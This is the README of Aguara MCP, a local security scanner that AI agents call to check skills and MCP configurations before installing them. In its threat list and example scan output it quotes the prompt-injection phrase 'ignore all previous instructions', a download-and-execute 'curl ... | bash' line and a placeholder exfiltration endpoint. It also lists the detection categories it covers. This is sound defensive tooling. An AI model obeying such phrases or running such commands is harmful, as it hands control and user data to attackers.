# Aguara MCP

**Security advisor for AI agents.**

Aguara MCP is an [MCP server](https://modelcontextprotocol.io/) that gives AI agents the ability to scan skills, plugins, and MCP configurations for security threats — before installing or running them.

Powered by [Aguara](https://github.com/garagon/aguara), the open-source security scanner purpose-built for the AI agent ecosystem. 148 rules, 15 threat categories, zero network access, fully deterministic.

## The problem

AI agents are gaining autonomy. They browse registries, discover tools, install MCP servers, and execute third-party code — often without any security review.

This creates a new attack surface. A skill published to a registry today can contain:

- **Prompt injection** that hijacks the agent's behavior ("ignore all previous instructions...")
- **Credential theft** that exfiltrates API keys, tokens, and secrets from the agent's environment
- **Remote code execution** hidden in install scripts (`curl | bash`, shell injection)
- **Data exfiltration** that silently sends user data to attacker-controlled endpoints
- **Supply chain attacks** through dependency confusion and typosquatting

The agent doesn't know. It can't tell a helpful tool from a weaponized one. The description looks normal. The install succeeds. The damage is done.

**This is the gap Aguara MCP fills.** It gives the agent a security advisor it can consult as a tool — the same way a developer would run a linter before merging code. One tool call, milliseconds, entirely local. The agent checks first, then decides.

## Quick start

```bash
curl -fsSL https://raw.githubusercontent.com/garagon/aguara-mcp/main/install.sh | sh
```

Or with Go:

```bash
go install github.com/garagon/aguara-mcp@latest
```

One command, one binary, no external dependencies.

> Make sure the install directory (`~/.local/bin` or `$GOPATH/bin`) is in your `PATH`.

### Add to your AI agent

**Claude Code:**

```bash
claude mcp add aguara -- aguara-mcp
```

**Claude Desktop** — add to `claude_desktop_config.json`:

```json
{
  "mcpServers": {
    "aguara": {
      "command": "aguara-mcp"
    }
  }
}
```

**Cursor / Windsurf / any MCP client** — stdio transport with `aguara-mcp`.

Your agent now has a security advisor.

## Tools

### `scan_content`

Scan text for security threats. Use it on skill descriptions, tool definitions, READMEs, or any untrusted content before acting on it.

| Parameter | Required | Description |
|-----------|----------|-------------|
| `content` | Yes | The text content to scan |
| `filename` | No | Filename hint for rule matching (default: `skill.md`) |

Returns a structured report with severity-rated findings, matched patterns, and line numbers.

### `check_mcp_config`

Analyze an MCP server configuration for dangerous patterns — exposed credentials, unsafe commands, overly permissive settings.

| Parameter | Required | Description |
|-----------|----------|-------------|
| `config` | Yes | MCP configuration as a JSON string |

### `list_rules`

Browse the full rule database. Useful when the agent needs to understand what threat categories exist or what Aguara can detect.

| Parameter | Required | Description |
|-----------|----------|-------------|
| `category` | No | Filter by category (e.g., `prompt-injection`, `exfiltration`, `credential-leak`) |

### `explain_rule`

Get details about a specific rule — what it detects, its patterns, and examples of true/false positives.

| Parameter | Required | Description |
|-----------|----------|-------------|
| `rule_id` | Yes | Rule ID (e.g., `PROMPT_INJECTION_001`) |

## Example

An agent evaluating whether to install an MCP server from a registry:

```
User: "Install the data-processor MCP server"

Agent (before installing, calls scan_content with the skill README):

→ {
    "summary": "Found 2 issues: 1 critical, 1 high",
    "findings": [
      {
        "severity": "CRITICAL",
        "rule_id": "SUPPLY_003",
        "rule_name": "Download-and-execute",
        "line": 12,
        "matched_text": "curl https://cdn.example.com/setup.sh | bash"
      },
      {
        "severity": "HIGH",
        "rule_id": "EXFIL_001",
        "rule_name": "Data exfiltration endpoint",
        "line": 34,
        "matched_text": "https://collect.example.com/data"
      }
    ]
  }

Agent: "I scanned the data-processor skill and found 2 security issues:
a script that downloads and executes remote code, and an endpoint that
could exfiltrate your data. I'd recommend not installing it."
```

Without Aguara MCP, the agent would have installed it silently.

## Coverage

148 rules across 13 threat categories:

| Category | Rules | Detects |
|----------|-------|---------|
| Prompt injection | 17 | Instruction override, jailbreaks, role hijacking |
| Credential leak | 19 | API keys, tokens, secrets in plain text |
| Exfiltration | 16 | Data sent to attacker-controlled endpoints |
| External download | 17 | curl\|bash, remote script execution |
| Command execution | 16 | Shell injection, subprocess spawning |
| Supply chain | 15 | Dependency confusion, typosquatting |
| MCP attacks | 12 | Tool poisoning, permission escalation |
| SSRF / Cloud | 10 | Metadata endpoint access, SSRF patterns |
| MCP config | 8 | Insecure server configurations |
| Unicode attacks | 7 | Homoglyphs, bidi overrides, invisible chars |
| Indirect injection | 6 | Injection via external content |
| Third-party content | 5 | Unvalidated external data consumption |

Plus NLP-based analysis for threats that evade static patterns.

## How it works

```
Agent                  Aguara MCP
  │                          │
  ├─ scan_content(text) ────►│
  │                          ├─ aguara.ScanContent()
  │                          │  (in-process, no disk I/O)
  │                          │  148 rules · 3 analyzers
  │◄─ structured report ─────┤
  │                          │
```

Aguara MCP imports the [Aguara scanner](https://github.com/garagon/aguara) as a Go library — no subprocess, no temp files, no external binary. The scan engine runs in-process with version integrity guaranteed by `go.sum`.

No network access. No LLM calls. No cloud dependencies. Everything runs locally and deterministically. Scans complete in milliseconds.

## Security

See [SECURITY.md](SECURITY.md) for the vulnerability disclosure policy.

Aguara MCP is itself security-hardened:

- **No subprocess execution** — Aguara runs as an in-process Go library, eliminating PATH hijacking and binary substitution risks
- **Input validation** — Rule IDs validated against strict format, content size capped at 10 MB
- **Filename sanitization** — Allowlisted characters only, length-capped, no path traversal
- **Version integrity** — Aguara scanner version is pinned in `go.sum`, verified at build time

## Advanced

Debug mode (logs scan details to stderr):

```bash
claude mcp add aguara -- aguara-mcp --debug
```

Build from source:

```bash
git clone https://github.com/garagon/aguara-mcp.git
cd aguara-mcp
make build    # → ./aguara-mcp
make test     # runs all tests
```

### Using Aguara as a Go library

Aguara MCP uses the Aguara public API. You can use it in your own tools:

```go
import "github.com/garagon/aguara"

result, err := aguara.ScanContent(ctx, content, "skill.md")
rules := aguara.ListRules(aguara.WithCategory("prompt-injection"))
detail, err := aguara.ExplainRule("PROMPT_INJECTION_001")
```

See the [Aguara documentation](https://github.com/garagon/aguara) for the full API reference.

## License

[MIT](LICENSE)
